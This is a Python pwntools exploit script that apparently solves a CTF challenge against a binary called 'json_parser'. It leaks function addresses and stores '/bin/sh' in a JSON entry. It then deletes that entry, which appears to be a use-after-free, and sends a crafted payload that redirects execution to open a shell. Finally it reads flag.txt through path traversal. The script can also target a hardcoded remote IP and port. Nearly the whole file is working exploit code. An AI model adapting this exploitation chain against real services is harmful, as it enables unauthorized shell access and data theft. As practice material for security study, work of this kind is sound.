#!/usr/bin/env python3

from pwn import *

exe = ELF('json_parser', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
context.binary = exe
context.terminal = [ '/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', '0', 'split-pane', '--size', '0.6', '-d', '.', 'wsl.exe','-d', 'Parrot', 'bash', '-c' ]

debug = lambda msg: log.debug(msg)
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
error = lambda msg: log.error(msg)
critical = lambda msg: log.critical(msg)
warning = lambda msg: log.warning(msg)

s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE and not args.DOCKER:
        gdb.attach(p, gdbscript='''
        set follow-fork-mode parent
        b*0x0000000000401BC5
        b*0x0000000000401A80

        c
        ''')
        input()

if args.REMOTE:
    p = remote('222.255.138.122',10167)
elif args.DOCKER:
    p = remote('')
else:
    p = process([exe.path])
    
GDB()

sla(b'> ', b'symbols')

p.recvuntil(b'safe_echo=')
safe_echo = int(p.recv(8), 16)
p.recvuntil(b'launch_shell=')
launch_shell = int(p.recv(8), 16)

success("safe echo: " + hex(safe_echo))
success("launch shell: " + hex(launch_shell))

sla(b"> ", b"symbols")

sla(b"> ", b'load {"x":"/bin/sh"}')
sla(b"> ", b"del x")

payload = (
    b"0000000700000001 "
    b"0068732f6e69622f "
    b"0000000000000000 "
    b"0000000000000000 "
    b"0000000000000000 "
    b"0000000000000000 "
    b"0000000000000000 "
    b"0000000000401510"
)

sla(b"> ", b"sample " + payload)
sla(b"> ", b"run")

sl(b'cat ../../../flag.txt')
    
p.interactive()
